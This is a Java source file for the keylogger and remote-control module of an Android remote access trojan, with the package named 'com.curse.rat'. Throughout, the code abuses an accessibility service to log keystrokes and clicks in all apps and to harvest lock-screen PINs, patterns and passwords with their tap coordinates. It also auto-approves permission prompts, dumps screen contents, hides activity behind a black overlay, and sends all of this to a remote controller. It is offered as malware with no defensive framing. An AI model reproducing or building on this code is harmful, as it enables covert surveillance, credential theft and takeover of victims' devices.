package com.curse.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

import android.app.KeyguardManager;
import android.content.Context;
import java.util.HashMap;
import java.util.Map;

public class KeylogManager extends AccessibilityService {
    private static final String TAG = "KeylogManager";
    private static KeylogManager instance;
    private static boolean isReadingScreen = false;
    private CommandProcessor commandProcessor;
    private WindowManager windowManager;
    private FrameLayout blackOverlay;
    private KeyguardManager keyguardManager;

    // Harvester states
    private String capturedPin = "";
    private String capturedPattern = "";
    private String capturedPassword = "";
    private boolean wasLocked = false;
    private Map<String, String> coordMap = new HashMap<>();

    public static KeylogManager getInstance() {
        return instance;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        commandProcessor = new CommandProcessor(this);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        Log.d(TAG, "Keylogger/Reader Service Connected");
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "accessibility_status");
            jo.put("enabled", true);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }

    public void processCommand(String command, String argument) {
        if (commandProcessor != null) {
            commandProcessor.process(command, argument);
        }
    }

    public void toggleBlackOverlay(boolean enable) {
        if (enable) {
            if (blackOverlay == null) {
                blackOverlay = new FrameLayout(this);
                blackOverlay.setBackgroundColor(Color.BLACK);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 
                            WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP;
                windowManager.addView(blackOverlay, params);
            }
        } else {
            if (blackOverlay != null) {
                windowManager.removeView(blackOverlay);
                blackOverlay = null;
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            boolean isLocked = keyguardManager != null && keyguardManager.isKeyguardLocked();
            
            // Check for Unlock Success
            if (wasLocked && !isLocked) {
                reportUnlockSuccess();
            }
            wasLocked = isLocked;

            // Harvester logic
            if (isLocked) {
                harvestLockScreen(event);
            }

            // Auto-grant logic
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (packageName.equals("com.android.systemui") || packageName.contains("settings") || packageName.contains("packageinstaller")) {
                    autoClickStartNow();
                }
            }

            // Screen Reader Logic
            if (isReadingScreen && (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
                dumpScreen();
            }

            // Keylogger Logic
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
            String eventData = "";
            int eventType = event.getEventType();

            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (!event.getText().isEmpty()) {
                        eventData = event.getText().toString();
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        eventData = "[Clicked: " + event.getText().toString() + "]";
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        eventData = "[Focused: " + event.getText().toString() + "]";
                    }
                    break;
            }

            if (!eventData.isEmpty()) {
                JSONObject jo = new JSONObject();
                jo.put("type", "keylog");
                jo.put("app", pkg);
                jo.put("data", eventData);
                jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date()));
                ConnectionManager.send(jo.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Accessibility Event Error: " + e.getMessage());
        }
    }

    private void harvestLockScreen(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED && 
            event.getEventType() != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
            event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;

        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        String resId = source.getViewIdResourceName();
        if (resId == null) return;

        Rect bounds = new Rect();
        source.getBoundsInScreen(bounds);
        String coords = bounds.centerX() + "," + bounds.centerY();

        // PIN logic
        if (resId.contains("com.android.systemui:id/key")) {
            String key = resId.substring(resId.lastIndexOf("key") + 3);
            if (key.matches("\\d")) {
                capturedPin += key;
                coordMap.put("PIN_" + key, coords);
                Log.d(TAG, "PIN Capture: " + key);
            } else if (key.equals("_enter") || key.equals("_ok")) {
                capturedPin += "[E]";
                coordMap.put("PIN_ENTER", coords);
            }
        }
        
        // Pattern logic
        if (resId.contains("lockPatternView")) {
            CharSequence contentDesc = source.getContentDescription();
            if (contentDesc != null) {
                String cell = contentDesc.toString();
                if (!capturedPattern.contains(cell)) {
                    capturedPattern += cell + " ";
                    coordMap.put("PT_" + cell, coords);
                    Log.d(TAG, "Pattern Capture: " + cell);
                }
            }
        }

        // Password logic
        if (resId.contains("passwordEntry") || resId.contains("miui_mixed_password")) {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                capturedPassword = event.getText().toString();
                Log.d(TAG, "Password Capture: " + capturedPassword);
            }
        }
    }

    private void reportUnlockSuccess() {
        try {
            if (capturedPin.isEmpty() && capturedPattern.isEmpty() && capturedPassword.isEmpty()) return;

            JSONObject jo = new JSONObject();
            jo.put("type", "lock_captured");
            jo.put("pin", capturedPin);
            jo.put("pattern", capturedPattern.trim());
            jo.put("password", capturedPassword);
            
            JSONObject coords = new JSONObject();
            for (Map.Entry<String, String> entry : coordMap.entrySet()) {
                coords.put(entry.getKey(), entry.getValue());
            }
            jo.put("coords", coords);
            
            ConnectionManager.send(jo.toString());
            
            // Reset for next time
            capturedPin = "";
            capturedPattern = "";
            capturedPassword = "";
        } catch (Exception ignored) {}
    }

    private void autoClickStartNow() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // Common texts for the "Start now" button across different Android versions/languages
        String[] targets = {"Start now", "START NOW", "Allow", "ALLOW", "Inizializza ora", "Comenzar ahora", "Commencer"};
        
        for (String target : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Auto-clicked: " + target);
                        return;
                    }
                }
            }
        }
    }

    public void startScreenReader() {
        isReadingScreen = true;
        dumpScreen();
    }

    public void stopScreenReader() {
        isReadingScreen = false;
    }

    private void dumpScreen() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) return;

                    JSONArray nodes = new JSONArray();
                    processNode(root, nodes);
                    
                    JSONObject jo = new JSONObject();
                    jo.put("type", "screen_reader");
                    jo.put("nodes", nodes);
                    ConnectionManager.send(jo.toString());
                } catch (Exception e) {
                    Log.e(TAG, "Dump Screen Error: " + e.getMessage());
                }
            }
        }).start();
    }

    private void processNode(AccessibilityNodeInfo node, JSONArray nodes) {
        if (node == null) return;
        try {
            JSONObject jo = new JSONObject();
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);

            CharSequence text = node.getText();
            CharSequence contentDesc = node.getContentDescription();
            
            jo.put("t", text != null ? text.toString() : "");
            jo.put("c", contentDesc != null ? contentDesc.toString() : "");
            jo.put("cl", node.getClassName() != null ? node.getClassName().toString() : "");
            jo.put("b", bounds.left + "," + bounds.top + "," + bounds.right + "," + bounds.bottom);
            jo.put("ck", node.isClickable());
            
            if (!jo.getString("t").isEmpty() || !jo.getString("c").isEmpty() || node.isClickable()) {
                nodes.put(jo);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                processNode(node.getChild(i), nodes);
            }
        } catch (Exception ignored) {}
    }

    public void performAction(int actionId) {
        performGlobalAction(actionId);
    }

    public void click(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(x, y);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
            dispatchGesture(builder.build(), null, null);
        }
    }

    public void swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
            dispatchGesture(builder.build(), null, null);
        }
    }

    @Override
    public void onInterrupt() { instance = null; }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        instance = null;
        return super.onUnbind(intent);
    }
}
